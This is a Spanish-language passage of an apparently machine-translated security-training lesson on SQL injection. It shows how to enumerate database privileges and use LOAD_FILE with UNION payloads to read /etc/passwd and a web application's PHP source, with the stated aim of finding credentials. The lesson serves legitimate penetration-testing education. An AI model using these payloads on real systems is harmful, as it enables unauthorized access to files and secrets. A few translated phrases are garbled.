# Reading Files

Además de recopilar datos de varias tablas y bases de datos dentro del DBMS, una inyección SQL también se puede aprovechar para realizar muchas otras operaciones, como leer y escribir archivos en el servidor e incluso obtener la ejecución de código remoto en el servidor de fondo.

---

# **Privilegios**

La lectura de datos es mucho más común que escribir datos, que está estrictamente reservado para usuarios privilegiados en los DBMS modernos, como puede conducir a la explotación del sistema, como veremos. Por ejemplo, en`MySQL`, el usuario de DB debe tener el`FILE`privilegio de cargar el contenido de un archivo en una tabla y luego volcar datos de esa tabla y leer archivos. Por lo tanto, comencemos por recopilar datos sobre los privilegios de nuestros usuarios dentro de la base de datos para decidir si leeremos y/o escribiremos archivos en el servidor de back-end.

### **Usuario de DB**

Primero, tenemos que determinar qué usuario estamos dentro de la base de datos. Si bien no necesariamente necesitamos privilegios de administrador de bases de datos (DBA) para leer datos, esto se requiere más en los DBMS modernos, ya que solo DBA se les da tales privilegios. Lo mismo se aplica a otras bases de datos comunes. Si tenemos privilegios de DBA, entonces es mucho más probable que tengamos privilegios de lectura de archivos. Si no lo hacemos, entonces tenemos que verificar nuestros privilegios para ver qué podemos hacer. Para poder encontrar a nuestro usuario de DB actual, podemos usar cualquiera de las siguientes consultas:

Código:sql

```sql
SELECT USER()
SELECT CURRENT_USER()
SELECT user from mysql.user

```

Nuestro`UNION`La carga útil de la inyección será la siguiente:

Código:sql

```sql
cn' UNION SELECT 1, user(), 3, 4-- -

```

o:

Código:sql

```sql
cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -

```

Lo que nos dice a nuestro usuario actual, que en este caso es`root`:

![](https://academy.hackthebox.com/storage/modules/33/db_user.jpg)

Esto es muy prometedor, ya que es probable que un usuario raíz sea un DBA, lo que nos da muchos privilegios.

### **Privilegios de usuario**

Ahora que conocemos a nuestro usuario, podemos comenzar a buscar qué privilegios tenemos con ese usuario. En primer lugar, podemos probar si tenemos privilegios de super administrador con la siguiente consulta:

Código:sql

```sql
SELECT super_priv FROM mysql.user

```

Una vez más, podemos usar la siguiente carga útil con la consulta anterior:

Código:sql

```sql
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -

```

Si tuvimos muchos usuarios dentro del DBMS, podemos agregar`WHERE user="root"`para mostrar solo privilegios para nuestro usuario actual`root`:

Código:sql

```sql
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -

```

![](https://academy.hackthebox.com/storage/modules/33/root_privs.jpg)

La consulta regresa`Y`, que significa`YES`, indicando privilegios de superusuario. También podemos volcar otros privilegios que tenemos directamente del esquema, con la siguiente consulta:

Código:sql

```sql
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -

```

Desde aquí, podemos agregar`WHERE grantee="'root'@'localhost'"`Para mostrar solo a nuestro usuario actual`root`privilegios. Nuestra carga útil sería:

Código:sql

```sql
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -

```

Y vemos todos los posibles privilegios dados a nuestro usuario actual:

![](https://academy.hackthebox.com/storage/modules/33/root_privs_2.jpg)

Vemos que el`FILE`El privilegio se enumera para nuestro usuario, lo que nos permite leer archivos e incluso escribir archivos. Por lo tanto, podemos continuar intentando leer archivos.

---

# **Load_file**

Ahora que sabemos que tenemos suficientes privilegios para leer archivos del sistema local, hagamos eso utilizando el`LOAD_FILE()`función. El[Load_file ()](https://mariadb.com/kb/en/load_file/)La función se puede usar en MariadB / MySQL para leer datos de los archivos. La función toma solo un argumento, que es el nombre del archivo. La siguiente consulta es un ejemplo de cómo leer el`/etc/passwd`archivo:

Código:sql

```sql
SELECT LOAD_FILE('/etc/passwd');

```

Nota: Solo podremos leer el archivo si el usuario del sistema operativo que ejecuta MySQL tiene suficientes privilegios para leerlo.

Similar a cómo hemos estado usando un`UNION`inyección, podemos usar la consulta anterior:

Código:sql

```sql
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -

```

![](https://academy.hackthebox.com/storage/modules/33/load_file_sqli.png)

Pudimos leer con éxito el contenido del archivo PASSWD a través de la inyección SQL. Desafortunadamente, esto también se puede usar para filtrar el código fuente de la aplicación.

---

# **Otro ejemplo**

Sabemos que la página actual es`search.php`. El APACHE TRABA DE APACHA predeterminado es`/var/www/html`. Intentemos leer el código fuente del archivo en`/var/www/html/search.php`.

Código:sql

```sql
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -

```

![](https://academy.hackthebox.com/storage/modules/33/load_file_search.png)

Sin embargo, la página termina haciendo que el código HTML dentro del navegador. La fuente HTML se puede ver golpeando`[Ctrl + U]`.

![](https://academy.hackthebox.com/storage/modules/33/load_file_source.png)

El código fuente nos muestra todo el código PHP, que podría inspeccionarse aún más para encontrar información confidencial como credenciales de conexión de base de datos o encontrar más vulnerabilidades.